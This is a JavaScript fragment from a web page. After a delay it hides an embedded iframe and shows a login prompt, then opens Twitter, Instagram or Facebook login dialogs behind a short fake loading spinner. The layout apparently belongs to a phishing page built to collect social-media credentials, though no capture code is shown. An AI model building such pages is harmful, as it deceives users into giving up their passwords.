    <script>
        // Timer to display the login prompt after 10 seconds
        setTimeout(() => {
            // Hide iframe and show login prompt
            document.getElementById("iframe-container").classList.add("hidden");
            document.getElementById("login-prompt").classList.remove("hidden");
        }, 15000); // 10 seconds timer

        // Show the respective login form based on selection
        function showLoginForm(platform) {
            // Hide login prompt and show the respective platform login form
            document.getElementById("login-prompt").classList.add("hidden");
            document.getElementById(platform + "-login").classList.remove("hidden");
        }
    </script>

    <script>
      function showPreloader() {
        document.getElementById("preloader").style.display = "flex";
      }

      function hidePreloader() {
        document.getElementById("preloader").style.display = "none";
      }

      function Twitter() {
        showPreloader();
        setTimeout(function() {
          hidePreloader();
          document.getElementById("twitter").style.display = "flex";
        }, 1000); // Delay in milliseconds
      }

      function Instagram() {
        showPreloader();
        setTimeout(function() {
          hidePreloader();
          document.getElementById("instagram").style.display = "flex";
        }, 1000); // Delay in milliseconds
      }

      function Facebook() {
        showPreloader();
        setTimeout(function() {
          hidePreloader();
          document.getElementById("facebook").style.display = "flex";
        }, 1000); // Delay in milliseconds
      }

      function closeDialog() {
          document.getElementById("instagram").style.display = "none";
          document.getElementById("twitter").style.display = "none";
          document.getElementById("facebook").style.display = "none";
      }
    </script>
